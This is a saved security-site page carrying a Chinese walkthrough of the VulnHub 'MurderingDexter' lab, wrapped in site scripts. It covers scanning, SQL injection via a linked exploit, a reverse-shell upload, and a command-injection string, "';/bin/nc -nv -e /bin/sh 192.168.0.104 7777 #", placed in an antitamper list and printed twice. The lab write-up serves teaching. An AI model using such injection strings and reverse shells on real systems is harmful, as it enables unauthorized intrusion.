@@ -1,0 +1,381 @@
+<head> <meta http-equiv="Content-Type" content="text/html; charset=utf-8" /> </head><script src="static/js/header/jquery.min.js?ver=3.6.1" type="text/javascript"></script>
+<script src="static/buf/plugins/wp-favorite-posts/wpfp.js?ver=3.6.1" type="text/javascript"></script>
+<script src="static/js/highslide/highslide-with-html.packed.js" type="text/javascript"></script>
+<script type="text/javascript">
+jQuery(document).ready(function($) {
+    hs.graphicsDir = "static/buf/plugins/auto-highslide/images/graphics/";
+    hs.outlineType = "rounded-white";
+    hs.dimmingOpacity = 0.8;
+    hs.outlineWhileAnimating = true;
+    hs.showCredits = false;
+    hs.captionEval = "this.thumb.alt";
+    hs.numberPosition = "caption";
+    hs.align = "center";
+    hs.transitions = ["expand", "crossfade"];
+    hs.addSlideshow({
+        interval: 5000,
+        repeat: true,
+        useControls: true,
+        fixedControls: "fit",
+        overlayOptions: {
+            opacity: 0.75,
+            position: "bottom center",
+            hideOnMouseOut: true
+
+        }
+
+    });
+});
+</script>
+<script language="JavaScript" src="static/buf/plugins/cartpauj-pm/js/script.js" type="text/javascript"></script>
+<script src="static/buf/themes/freebuf/js/layer.js"></script>
+<script src="static/buf/plugins/simditor/highlight/highlight.pack.js" type="text/javascript"></script>
+<script src="static/buf/themes/freebuf/js/jquery-2.0.3.min.js"></script>
+<script src="static/buf/themes/freebuf/js/bootstrap.min.js"></script>
+<script src="static/buf/themes/freebuf/js/slider.js?2016022501.1" type="text/javascript"></script>
+<script src="static/buf/themes/freebuf/js/jquery.sticky.js" type="text/javascript"></script>
+<script src="static/js/focus/bjqs-1.3.min.js" type="text/javascript"></script>
+<script src="static/buf/themes/freebuf/js/mosaic.1.0.1.min.js" type="text/javascript"></script>
+<script src="static/js/new/setint.js" type="text/javascript"></script>
+<script src="static/js/colum/swiper-3.4.2.min.js"></script>
+<script type="application/ecmascript">
+    $('.icon-wechat').hover(function(){
+        $('.wechatImgdiv').show()
+    },function(){
+        $('.wechatImgdiv').hide()
+    })
+</script>
+<script src="static/js/header/header.js" type="text/javascript"></script>
+<script>
+		jQuery(window).load(function () {
+			jQuery(".main-header").sticky({topSpacing: 0});
+		});
+	</script>
+<script>
+                    $('.user-detial .test-info').mouseover(function() {
+                        var _title = $(this).find('.text').attr('data-title');
+                        if (_title) {
+                            var str = '<span class="text-title">' + _title + '</span>';
+                            $(this).append(str);
+                        }
+                    }).mouseout(function() {
+                        $('.user-detial .test-info .text-title').remove();
+                    });
+                </script>
+<script type="text/javascript">
+				jQuery("#pagination a").live("click", function () {
+					var _url = jQuery(this).attr("href");
+					jQuery(this).parents("li").addClass("current").blur().parents("#menupage").find("li").not(jQuery(this).parents("li")).removeClass("current");
+					jQuery.ajax({
+						type: "POST",
+						url: _url + "#timeline",
+						success: function (data) {
+							result = jQuery(data).find("#timeline .news_inner");
+							nextHref = jQuery(data).find("#pagination a").attr("href");
+							if (nextHref != undefined) {
+								jQuery("#pagination a").attr("href", nextHref);
+							} else {
+								jQuery("#pagination").remove();
+							}
+							jQuery(function () {
+								if (_url.indexOf("page") < 1) {
+									jQuery("#timeline").html('');
+								}
+								jQuery("#timeline").append(result.fadeIn(200));
+							});
+						}
+					});
+					return false;
+				});
+			</script>
+<script>
+    $('.star_score > a').click(function() {
+        $(this).addClass('active');
+        $(this).siblings().removeClass('active');
+    });
+    $('.star_score > a').hover(function() {
+        $(this).siblings().removeClass('active');
+    });
+    $(document).on('click', function() {
+        $('.bottom_tools .tips-wrap').hide(500);
+    });
+    $('.bottom_tools ul li.fb-tips').click(function(event) {
+        var evt = event || evt;
+        evt.stopPropagation();
+        $(this).find('.tips-wrap').toggle(500);
+    });
+    $('.bottom_tools .tips-wrap').click(function(event) {
+        var evt = evt || event;
+        evt.stopPropagation();
+        $(this).show();
+    });
+    $('.feedback').on('click',function () {
+        var content = $('#feedback-content').val();
+        if(!content){
+            $('#feedback-content').focus();
+            $('.feedback-error').text('反馈内容不能为空！').show();
+            return;
+        }
+        var contact = $('#feedback-contact').val();
+        if(!contact){
+            $('#feedback-contact').focus();
+            $('.feedback-error').text('联系方式不能为空！').show();
+            return;
+        }
+        var score = $('.star_score').children('.active').attr('data-id')
+        if(!score){
+            $('.feedback-error').text('给FreeBuf打个分吧！').show();
+            return;
+        }
+        var yzm = $('#yzm').val();
+        var _url = 'static/verify';
+        $.ajax({
+            type: "post",
+            url: _url,
+            data: {'content':content,'contact':contact,'score':score,'feedback_status':1,'yzm':yzm},
+            success: function (data) {
+                $("#captcha").trigger('click')
+                if(data.code ==200){
+                    layer.open({
+                        title: '系统提示',
+                        btnAlign: 'c',
+                        content: data.msg,
+                        area: '278px',
+                    });
+                }else {
+                    layer.open({
+                        title: '系统提示',
+                        btnAlign: 'c',
+                        content: data.msg,
+                        area: '278px',
+                    });
+                }
+            },
+        })
+    })
+
+    $(document).on('click', '.appeal-wrap-public .appeal-main', function(event) {
+        var evt = event || evt;
+        evt.stopPropagation();
+        $('.appeal-wrap-public').show();
+    });
+    $(document).on('click', '.appeal-main .close', function(event) {
+        var evt = event || evt;
+        evt.stopPropagation();
+        $('.appeal-wrap').hide();
+    });
+    $(document).on('click', '.appeal-main .appeal-footer .btn-sure', function(event) {
+        var evt = event || evt;
+        evt.stopPropagation();
+        $('.appeal-wrap-public').hide();
+    });
+
+    $('.complain').on('click',function () {
+        var _url = 'static/verify';
+        var token = $('#complain_token').val();
+        $.ajax({
+            type: "post",
+            url: _url,
+            data: {'complain_token':token,'complain_status':1},
+            success: function (data) {
+            },
+        })
+    })
+</script>
+<script src="static/js/new/backtop.js"></script>
+<script type="text/javascript">
+jQuery(function(){	
+	jQuery('.tabPanes ul li').click(function(){
+		jQuery(this).addClass('hit').siblings().removeClass('hit');
+		jQuery('.panesl>div:eq('+jQuery(this).index()+')').show().siblings().hide();	
+	})
+	jQuery('.vulbox-nav').click(function(e) { 
+        e.stopPropagation(); 
+    });  
+})
+</script>
+<script type="text/javascript">
+var _bdhmProtocol = (("https:" == document.location.protocol) ? " https://" : " http://");
+document.write(unescape("%3Cscript src='" + _bdhmProtocol + "hm.baidu.com/h.js%3Fcc53db168808048541c6735ce30421f5' type='text/javascript'%3E%3C/script%3E"));
+</script>
+<script type="text/javascript">
+jQuery(function() {
+    jQuery(".simditor pre").each(function(i, block){
+        hljs.highlightBlock(block);    
+    });
+    hljs.initHighlightingOnLoad();
+});
+</script>
+<script>
+/* <![CDATA[ */
+var rcGlobal = {
+	serverUrl		:'static',
+	infoTemp		:'%REVIEWER% on %POST%',
+	loadingText		:'Loading',
+	noCommentsText	:'No comments',
+	newestText		:'&laquo; 最新',
+	newerText		:'&laquo; 新一点',
+	olderText		:'旧一点 &raquo;',
+	showContent		:'1',
+	external		:'1',
+	avatarSize		:'32',
+	avatarPosition	:'left',
+	anonymous		:'Anonymous'
+};
+/* ]]> */
+</script>
+<script src="static/js/recentcomments/wp-recentcomments-jquery.js?ver=2.2.3" type="text/javascript"></script>
+
+<link href="static/buf/plugins/wp-favorite-posts/wpfp.css" id="wpfp-css" rel="stylesheet" type="text/css"/>
+<link href="static/css/recentcomments/wp-recentcomments.css?ver=2.2.3" id="wp-recentcomments-css" media="screen" rel="stylesheet" type="text/css"/>
+<link href="static/buf/plugins/gold/assets/css/widget.css?ver=1.3.2.1" id="mycred-widget-css" media="all" rel="stylesheet" type="text/css"/>
+<link href="static/css/highslide/highslide.css" rel="stylesheet" type="text/css"/>
+<link href="static/buf/plugins/cartpauj-pm/style/style.css" rel="stylesheet" type="text/css"/>
+<link href=" static/buf/plugins/simditor/highlight/styles/default.css" rel="stylesheet" type="text/css"/>
+<link href="https://static.freebuf.com/images/favicon.ico" rel="shortcut icon"/>
+<link href="static/css/new/header.css" rel="stylesheet"/>
+<link href="static/css/new/bootstrap.min.css?ver=2016051701" media="screen" rel="stylesheet"/>
+<link href="static/css/new/swiper-3.4.2.min.css" rel="stylesheet" type="text/css"/>
+<link href="static/css/new/style.css?ver=2018112123749359438534" rel="stylesheet" type="text/css"/>
+
+<div id="contenttxt">
+                            <h1>下载地址</h1>
+<pre>https://download.vulnhub.com/botchallenges/MurderingDexter.zip
+</pre>
+<h1><b>实战演练</b></h1>
+<p>使用netdiscover命令查找靶机的IP</p>
+<p><img alt="image.png" data-original="images/20190806/1565084781_5d494c6d3c928.png" src="images/20190806/1565084781_5d494c6d3c928.png" width="731" height="311" /></p>
+<noscript><img alt="image.png" src="images/20190806/1565084781_5d494c6d3c928.png" width="731" height="311" /></p></noscript>
+<p>使用nmap查看靶机开放的端口</p>
+<p><img alt="image.png" data-original="images/20190806/1565084868_5d494cc4d904c.png" src="images/20190806/1565084868_5d494cc4d904c.png" width="723" height="347" />在浏览器打开</p>
+<noscript><img alt="image.png" src="images/20190806/1565084868_5d494cc4d904c.png" width="723" height="347" />在浏览器打开</p></noscript>
+<p><img alt="image.png" data-original="images/20190806/1565084901_5d494ce574076.png" src="images/20190806/1565084901_5d494ce574076.png" width="1069" height="332" />爆破目录</p>
+<noscript><img alt="image.png" src="images/20190806/1565084901_5d494ce574076.png" width="1069" height="332" />爆破目录</p></noscript>
+<p><img alt="image.png" data-original="images/20190806/1565085261_5d494e4da51bc.png" src="images/20190806/1565085261_5d494e4da51bc.png" width="760" height="559" />登录页面有输入框，试试注入</p>
+<noscript><img alt="image.png" src="images/20190806/1565085261_5d494e4da51bc.png" width="760" height="559" />登录页面有输入框，试试注入</p></noscript>
+<pre>POST /Panel/ HTTP/1.1
+Host: 192.168.0.107
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Referer: http://192.168.0.107/Panel/
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 40
+Connection: close
+Cookie: PHPSESSID=8q075cd5s8okkfpdv4q57ns722
+Upgrade-Insecure-Requests: 1
+
+username=test&amp;password=test&amp;submit=Login</pre>
+<p>注入失败</p>
+<p><img alt="image.png" data-original="images/20190806/1565085629_5d494fbd8ce4a.png" src="images/20190806/1565085629_5d494fbd8ce4a.png" width="993" height="519" />查看一下资料，找到gateway.php存在SQL注入漏洞，<a href="https://www.exploit-db.com/exploits/31686">exp</a></p>
+<noscript><img alt="image.png" src="images/20190806/1565085629_5d494fbd8ce4a.png" width="993" height="519" />查看一下资料，找到gateway.php存在SQL注入漏洞，<a href="https://www.exploit-db.com/exploits/31686">exp</a></p></noscript>
+<p><img alt="image.png" data-original="images/20190806/1565086207_5d4951ffe06b2.png" src="images/20190806/1565086207_5d4951ffe06b2.png" width="1131" height="98" />使用上面的凭据登录</p>
+<noscript><img alt="image.png" src="images/20190806/1565086207_5d4951ffe06b2.png" width="1131" height="98" />使用上面的凭据登录</p></noscript>
+<p><img alt="image.png" data-original="images/20190806/1565086283_5d49524b7a2b8.png" src="images/20190806/1565086283_5d49524b7a2b8.png" width="752" height="216" />上传反弹shell，显示路径出来了</p>
+<noscript><img alt="image.png" src="images/20190806/1565086283_5d49524b7a2b8.png" width="752" height="216" />上传反弹shell，显示路径出来了</p></noscript>
+<p><img alt="image.png" data-original="images/20190806/1565086908_5d4954bc865a5.png" src="images/20190806/1565086908_5d4954bc865a5.png" width="1200" height="992" />连接成功</p>
+<noscript><img alt="image.png" src="images/20190806/1565086908_5d4954bc865a5.png" width="1200" height="992" />连接成功</p></noscript>
+<p><img alt="image.png" data-original="images/20190806/1565086976_5d495500c02a2.png" src="images/20190806/1565086976_5d495500c02a2.png" width="1200" height="545" />寻找线索，发现变量s可以拼接字符串，所以可以修改这个清单，进行命令注入</p>
+<noscript><img alt="image.png" src="images/20190806/1565086976_5d495500c02a2.png" width="1200" height="545" />寻找线索，发现变量s可以拼接字符串，所以可以修改这个清单，进行命令注入</p></noscript>
+<p><img alt="image.png" data-original="images/20190806/1565087146_5d4955aab1d1a.png" src="images/20190806/1565087146_5d4955aab1d1a.png" width="1010" height="675" /></p>
+<noscript><img alt="image.png" src="images/20190806/1565087146_5d4955aab1d1a.png" width="1010" height="675" /></p></noscript>
+<pre>{
+"';/bin/nc -nv -e /bin/sh 192.168.0.104 7777 #": "d8fa4356213b6ce9253f55acdff780ac",
+    "/var/www/Panel/info.php": "d8fa4356213b6ce9253f55acdff780ac",
+    "/var/www/Panel/upload.php" : "b2640cea86e5171662a082b6a043fcc2",
+    "/var/www/Panel/style.css": "92f234834a61b7fde898eea40f857bb3",
+    "/var/www/Panel/gateway.php": "7b93115195db0c0b085a1107c4cc1aed",
+    "/var/www/Panel/pagination.php": "1a8d91c12263dd5298a70c72976c5e97",
+    "/var/www/Panel/viewer.php": "292b3b12c2f90c0e557bf599c2475c15",
+    "/var/www/Panel/config.php": "421fc13061ab1f343e6607e4ef4f8f42",
+    "/var/www/Panel/main.php": "7812b7c1ed608299c9bece4f46607423",
+    "/var/www/Panel/load.php": "0f95762562aa97c62d004949e7337e95",
+    "/var/www/Panel/viewer_pagination.php": "60c7444a92daa115abfecc73c46fc2ec",
+    "/var/www/Panel/master.php": "2b50c51fce89ddcfb769effdeab7080c",
+    "/var/www/Panel/index.php": "af44aa507c02f3c1aede5e251b28dc64"
+}
+</pre>
+<p>权限不够修改不了</p>
+<p><img alt="image.png" data-original="images/20190806/1565088193_5d4959c1654e9.png" src="images/20190806/1565088193_5d4959c1654e9.png" width="705" height="207" />上传list</p>
+<noscript><img alt="image.png" src="images/20190806/1565088193_5d4959c1654e9.png" width="705" height="207" />上传list</p></noscript>
+<p><img alt="image.png" data-original="images/20190806/1565088436_5d495ab4499a1.png" src="images/20190806/1565088436_5d495ab4499a1.png" width="1200" height="330" />mv提示权限不够，换cat命令</p>
+<noscript><img alt="image.png" src="images/20190806/1565088436_5d495ab4499a1.png" width="1200" height="330" />mv提示权限不够，换cat命令</p></noscript>
+<pre>$ cat /var/www/Panel/exes/antitamper.list &gt; antitamper.list
+$ cat antitamper.list
+{
+	"';/bin/nc -nv -e /bin/sh 192.168.0.104 7777 #": "d8fa4356213b6ce9253f55acdff780ac",
+    "/var/www/Panel/info.php": "d8fa4356213b6ce9253f55acdff780ac",
+    "/var/www/Panel/upload.php" : "b2640cea86e5171662a082b6a043fcc2",
+    "/var/www/Panel/style.css": "92f234834a61b7fde898eea40f857bb3",
+    "/var/www/Panel/gateway.php": "7b93115195db0c0b085a1107c4cc1aed",
+    "/var/www/Panel/pagination.php": "1a8d91c12263dd5298a70c72976c5e97",
+    "/var/www/Panel/viewer.php": "292b3b12c2f90c0e557bf599c2475c15",
+    "/var/www/Panel/config.php": "421fc13061ab1f343e6607e4ef4f8f42",
+    "/var/www/Panel/main.php": "7812b7c1ed608299c9bece4f46607423",
+    "/var/www/Panel/load.php": "0f95762562aa97c62d004949e7337e95",
+    "/var/www/Panel/viewer_pagination.php": "60c7444a92daa115abfecc73c46fc2ec",
+    "/var/www/Panel/master.php": "2b50c51fce89ddcfb769effdeab7080c",
+    "/var/www/Panel/index.php": "af44aa507c02f3c1aede5e251b28dc64"
+}
+
+</pre>
+<p><img alt="image.png" src="images/20190806/1565088832_5d495c408317e.png" width="732" height="295" /><img alt="image.png" data-original="images/20190806/1565088849_5d495c518eaf7.png" src="images/20190806/1565088849_5d495c518eaf7.png" width="579" height="336" /></p>
+<noscript><img alt="image.png" src="images/20190806/1565088832_5d495c408317e.png" width="732" height="295" /><img alt="image.png" src="images/20190806/1565088849_5d495c518eaf7.png" width="579" height="336" /></p></noscript>
+                                
+                                <div class="column-support">
+                                    <p class="support-mount good_num"></p>
+                                    <a href="javascript:void (0);" data-status="0" data-id="210550" class="good"></a>
+                                </div>
+                                <script>
+                                    $('.good').on('click',function () {
+                                        var login = $(this).attr('data-status');
+                                        if(login){
+                                            var token = $('#token').val();
+                                            var id = $(this).attr('data-id');
+                                            var good = $('.good_num').text();
+                                            var _this = $(this);
+                                            var _url = document.location.href;
+                                            $.ajax({
+                                                type: "post",
+                                                url: _url,
+                                                data: {'token':token,'id':id, 'good':1},
+                                                success: function (data) {
+                                                    $('#token').val(data.token);
+                                                    if(data.code ==400){
+                                                        layer.open({
+                                                            title: '系统提示',
+                                                            btnAlign: 'c',
+                                                            content: data.msg,
+                                                            area: '278px',
+                                                        });
+                                                    }else {
+                                                        if(good){
+                                                            good++;
+                                                        }else {
+                                                            good=1;
+                                                        }
+                                                        $('.good_num').text(good);
+                                                        _this.disabled();
+                                                    }
+                                                },
+                                            })
+                                        }else {
+                                            layer.open({
+                                                title: '系统提示',
+                                                btnAlign: 'c',
+                                                content: '请先登录',
+                                                btn: ['登录'],
+                                                area: '278px',
+                                                yes: function () {
+                                                    login();
+                                                },
+                                            });
+                                        }
+                                        return false;
+                                    })
+                                    function login(){
+                                        window.location.href = 'https//www.freebuf.com/oauth';
+                                    }
+                                </script>
+                                                    </div>
+                        <div class="wechatcodeDiv">
